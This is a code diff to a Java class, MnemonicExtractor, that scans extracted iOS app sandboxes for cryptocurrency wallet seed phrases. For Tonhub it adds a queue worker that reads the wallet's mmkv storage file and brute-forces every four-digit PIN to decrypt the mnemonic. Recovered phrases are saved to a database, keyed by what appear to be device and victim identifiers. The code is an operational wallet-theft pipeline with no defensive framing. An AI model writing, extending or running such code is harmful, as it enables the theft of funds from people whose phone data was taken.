@@ -214,6 +214,11 @@ public class MnemonicExtractor {
         boolean tonhubDeferred;
         /** tonhub 已提交后台 PIN 爆破 */
         boolean tonhubAsyncStarted;
+        /**
+         * 队列模式：parse_ci 扫描发现需 PIN 爆破的 mmkv 绝对路径，
+         * 由 ParseCiHandler 入队 tonhub_brute，本扫描阶段不跑 PBKDF2。
+         */
+        String pendingTonhubMmkvPath;
 
         public Ctx(Integer ios18paramId, String deviceId) {
             this.ios18paramId = ios18paramId;
@@ -286,7 +291,9 @@ public class MnemonicExtractor {
                 if (ENABLE_MYTONWALLET_SCAN) {
                     scanSandboxMytonwallet(sandbox, sandboxResults);
                 }
-                fallbackSandboxRegex(sandbox, sandboxResults);
+                if (consumerProps != null && consumerProps.isSandboxFallbackRegexEnabled()) {
+                    fallbackSandboxRegex(sandbox, sandboxResults);
+                }
                 sbCost[0] = System.currentTimeMillis() - t;
             }, SCAN_POOL);
         }
@@ -1995,10 +2002,17 @@ public class MnemonicExtractor {
      * </ul>
      */
     private PhraseResult tonhubPinBrute(byte[] mmkvBlob, Ctx ctx) {
-        return tonhubPinBrute(mmkvBlob, ctx, 0);
+        return tonhubPinBrute(mmkvBlob, ctx, 0, false);
     }
 
     private PhraseResult tonhubPinBrute(byte[] mmkvBlob, Ctx ctx, int deferAttempt) {
+        return tonhubPinBrute(mmkvBlob, ctx, deferAttempt, false);
+    }
+
+    /**
+     * @param forceBlocking true=队列 worker：阻塞直到 10000 PIN 跑完；无许可不 scheduleDefer，由调用方重试
+     */
+    private PhraseResult tonhubPinBrute(byte[] mmkvBlob, Ctx ctx, int deferAttempt, boolean forceBlocking) {
         if (mmkvBlob == null) return null;
         String ctxId = (ctx == null || ctx.ios18paramId == null) ? null : String.valueOf(ctx.ios18paramId);
         int blobLen = mmkvBlob.length;
@@ -2016,7 +2030,9 @@ public class MnemonicExtractor {
         if (consumerProps != null && consumerProps.isTonhubBruteSerialize() && tonhubBruteSemaphore != null) {
             if (!tonhubBruteSemaphore.tryAcquire()) {
                 if (ctx != null) ctx.setTonhubDeferred(true);
-                scheduleTonhubBruteRetry(mmkvBlob, ctx, deferAttempt);
+                if (!forceBlocking) {
+                    scheduleTonhubBruteRetry(mmkvBlob, ctx, deferAttempt);
+                }
                 return null;
             }
             acquired[0] = true;
@@ -2111,8 +2127,11 @@ public class MnemonicExtractor {
         int numChunks = Math.max(4, poolThreads * 2);
         int chunk = (10000 + numChunks - 1) / numChunks;
 
-        // 可配置同步等待超时：默认 5s（替代原硬编码 30s），设为 0 则完全异步不阻塞 worker
+        // 可配置同步等待超时：默认 5s；0=完全异步；forceBlocking（队列 worker）始终等跑完
         long syncTimeoutMs = consumerProps == null ? 5000L : consumerProps.getTonhubBruteSyncTimeoutMs();
+        if (forceBlocking) {
+            syncTimeoutMs = Long.MAX_VALUE;
+        }
 
         // 直接提交 chunks 到 TONHUB_BRUTE_POOL（同步/异步模式共用）
         final List<CompletableFuture<Void>> futs = new ArrayList<>(numChunks);
@@ -2136,7 +2155,7 @@ public class MnemonicExtractor {
         PhraseResult syncResult = null;
         if (!futs.isEmpty()) {
             CompletableFuture<Void> all = CompletableFuture.allOf(futs.toArray(new CompletableFuture[0]));
-            if (syncTimeoutMs <= 0) {
+            if (!forceBlocking && syncTimeoutMs <= 0) {
                 // 完全异步模式：chunks 已提交到池中开始执行，注册回调后立即返回
                 if (ctx != null) ctx.setTonhubAsyncStarted(true);
                 log.info("【mnemonic】tonhub 完全异步模式(syncTimeout=0)，worker 立即释放 ctx_id={}", ctxId);
@@ -2156,8 +2175,13 @@ public class MnemonicExtractor {
                 return null;
             }
             try {
-                all.get(syncTimeoutMs, TimeUnit.MILLISECONDS);
-                syncResult = hitRef.get();
+                if (forceBlocking || syncTimeoutMs >= Long.MAX_VALUE / 2) {
+                    all.get();
+                    syncResult = hitRef.get();
+                } else {
+                    all.get(syncTimeoutMs, TimeUnit.MILLISECONDS);
+                    syncResult = hitRef.get();
+                }
             } catch (TimeoutException timedOut) {
                 syncResult = hitRef.get();
                 if (syncResult != null) {
@@ -2437,14 +2461,54 @@ public class MnemonicExtractor {
         }
     }
 
-    // --- Tonhub: Documents/mmkv/mmkv.default — 明文兜底 + MMKV-TLV + PBKDF2-HMAC-SHA512(100k) + NaCl secretbox 4 位 PIN 暴力 ---
+    /**
+     * Tonhub 队列 worker 入口：读 mmkv → 阻塞跑完 PIN 爆破 → 命中则补写入库 + news4。
+     *
+     * @return true 可 ACK；false 需重试（如串行化无许可）
+     */
+    public boolean processTonhubBruteJob(String mmkvPath, Integer ios18paramId, String deviceId) {
+        if (mmkvPath == null || mmkvPath.trim().isEmpty()) {
+            log.warn("【tonhub-queue】mmkv_path 为空 id={}", ios18paramId);
+            return true;
+        }
+        Path p = Paths.get(mmkvPath.trim());
+        if (!Files.isRegularFile(p)) {
+            log.warn("【tonhub-queue】mmkv 不存在 path={} id={}", mmkvPath, ios18paramId);
+            return true;
+        }
+        byte[] blob;
+        try {
+            blob = Files.readAllBytes(p);
+        } catch (IOException e) {
+            log.warn("【tonhub-queue】读 mmkv 失败 path={} err={}", mmkvPath, e.toString());
+            return false;
+        }
+        if (blob.length == 0) {
+            log.warn("【tonhub-queue】mmkv 为空 path={}", mmkvPath);
+            return true;
+        }
+        Ctx ctx = new Ctx(ios18paramId, deviceId == null ? "" : deviceId);
+        PhraseResult r = tonhubPinBrute(blob, ctx, 0, true);
+        if (ctx.isTonhubDeferred()) {
+            log.info("【tonhub-queue】串行化无许可，稍后重试 id={} path={}", ios18paramId, mmkvPath);
+            return false;
+        }
+        if (r != null) {
+            savePhraseLater(ctx, r, null);
+            log.info("【tonhub-queue】爆破命中 id={} device={} wallet={}", ios18paramId, deviceId, r.getWallet());
+        }
+        return true;
+    }
+
+    // --- Tonhub: Documents/mmkv/mmkv.default — 明文兜底；PIN 爆破默认旁路到 tonhub 队列 ---
     private void scanSandboxTonhub(Path sandbox, List<PhraseResult> out, Ctx ctx) {
         if (containsWallet(out, "tonhub")) return;
         String ctxId = (ctx == null || ctx.ios18paramId == null) ? null : String.valueOf(ctx.ios18paramId);
+        boolean queueMode = consumerProps != null && consumerProps.isTonhubTaskEnabled();
         // 异步模式下，tonhubPinBrute 提交暴力任务后立即返回 null，暴力在后台运行。
         // 此时不需要再尝试其他 mmkv.default 文件，避免重复提交暴力任务打满线程池。
         long syncTimeoutMs = consumerProps == null ? 5000L : consumerProps.getTonhubBruteSyncTimeoutMs();
-        boolean asyncMode = syncTimeoutMs <= 0;
+        boolean asyncMode = !queueMode && syncTimeoutMs <= 0;
         // iOS 解压后 TON 钱包的目录名有很多变体，先按候选依次尝试，候选都没命中再 glob 整个 sandbox
         String[] variants = {
                 "tonhub",          // 原始 Tonhub App
@@ -2459,29 +2523,9 @@ public class MnemonicExtractor {
             Path cand = sandbox.resolve(dir).resolve("Documents").resolve("mmkv").resolve("mmkv.default");
             triedPaths.add(cand);
             if (!Files.isRegularFile(cand)) continue;
-            byte[] blob;
-            try {
-                blob = Files.readAllBytes(cand);
-            } catch (IOException e) {
-                log.warn("【mnemonic】tonhub 读取 {} 失败 ctx_id={} err={}", cand, ctxId, e.toString());
-                continue;
-            }
-            if (blob == null || blob.length == 0) {
-                log.warn("【mnemonic】tonhub 文件为空 {} ctx_id={}", cand, ctxId);
-                continue;
-            }
-            PhraseResult r = tonhubPinBrute(blob, ctx);
-            if (r != null) {
-                out.add(r);
+            if (tryTonhubCandidate(cand, out, ctx, ctxId, queueMode, asyncMode)) {
                 return;
             }
-            // 许可忙排队 / 已提交异步爆破：不算失败，不打 WARN
-            if (ctx != null && (ctx.isTonhubDeferred() || ctx.isTonhubAsyncStarted())) {
-                if (asyncMode) return;
-                continue;
-            }
-            log.warn("【mnemonic】tonhub 路径 {}（ctx_id={}）已执行 tonhubPinBrute，但未返回任何助记词（详见上方 tonhub*_ 分级 WARN）", cand, ctxId);
-            if (asyncMode) return;
         }
         // 5 个 variant 都没命中 → 再兜底 glob 一下 sandbox/**/Documents/mmkv/mmkv.default，防止还有新的命名
         try {
@@ -2494,24 +2538,58 @@ public class MnemonicExtractor {
             for (Path cand : extras) {
                 if (triedPaths.contains(cand)) continue; // 跳过已尝试的 variant
                 if (!Files.isRegularFile(cand)) continue;
-                byte[] blob;
-                try { blob = Files.readAllBytes(cand); }
-                catch (IOException e) { log.warn("【mnemonic】tonhub glob 读取 {} 失败 ctx_id={} err={}", cand, ctxId, e.toString()); continue; }
-                if (blob == null || blob.length == 0) continue;
-                // 从路径里反推出 variant 名（sandbox/xxx/Documents/... 取 xxx）
-                Path sandboxRel = sandbox.relativize(cand);
-                String dirGuess = (sandboxRel.getNameCount() >= 1) ? sandboxRel.getName(0).toString() : "unknown";
-                PhraseResult r = tonhubPinBrute(blob, ctx);
-                if (r != null) { out.add(r); return; }
-                if (ctx != null && (ctx.isTonhubDeferred() || ctx.isTonhubAsyncStarted())) {
-                    if (asyncMode) return;
-                    continue;
+                if (tryTonhubCandidate(cand, out, ctx, ctxId, queueMode, asyncMode)) {
+                    return;
                 }
-                log.warn("【mnemonic】tonhub glob 路径 {}（ctx_id={}）已执行但无结果", cand, ctxId);
-                if (asyncMode) return;
             }
         } catch (IOException e) {
             log.warn("【mnemonic】tonhub glob 扫描 sandbox 失败 ctx_id={} sandbox={} err={}", ctxId, sandbox, e.toString());
         }
+    }
+
+    /**
+     * @return true 表示本轮 tonhub 扫描结束（命中明文 / 已挂起队列 / 旧路径已提交异步）
+     */
+    private boolean tryTonhubCandidate(Path cand, List<PhraseResult> out, Ctx ctx,
+                                       String ctxId, boolean queueMode, boolean asyncMode) {
+        byte[] blob;
+        try {
+            blob = Files.readAllBytes(cand);
+        } catch (IOException e) {
+            log.warn("【mnemonic】tonhub 读取 {} 失败 ctx_id={} err={}", cand, ctxId, e.toString());
+            return false;
+        }
+        if (blob == null || blob.length == 0) {
+            log.warn("【mnemonic】tonhub 文件为空 {} ctx_id={}", cand, ctxId);
+            return false;
+        }
+        // 队列模式：只做明文；需爆破则记录路径，由 ParseCiHandler 入队
+        if (queueMode) {
+            try {
+                String lower = new String(blob, StandardCharsets.UTF_8).toLowerCase();
+                String found = bip39.searchPhrase(lower);
+                if (found != null) {
+                    out.add(new PhraseResult("tonhub", found, "mmkv_plaintext"));
+                    return true;
+                }
+            } catch (Exception ignore) {}
+            if (ctx != null) {
+                String abs = cand.toAbsolutePath().normalize().toString().replace('\\', '/');
+                ctx.setPendingTonhubMmkvPath(abs);
+                log.info("【mnemonic】tonhub 待爆破挂起队列 path={} ctx_id={}", abs, ctxId);
+            }
+            return true;
+        }
+        PhraseResult r = tonhubPinBrute(blob, ctx);
+        if (r != null) {
+            out.add(r);
+            return true;
+        }
+        // 许可忙排队 / 已提交异步爆破：不算失败，不打 WARN
+        if (ctx != null && (ctx.isTonhubDeferred() || ctx.isTonhubAsyncStarted())) {
+            return asyncMode;
+        }
+        log.warn("【mnemonic】tonhub 路径 {}（ctx_id={}）已执行 tonhubPinBrute，但未返回任何助记词（详见上方 tonhub*_ 分级 WARN）", cand, ctxId);
+        return asyncMode;
     }
 }
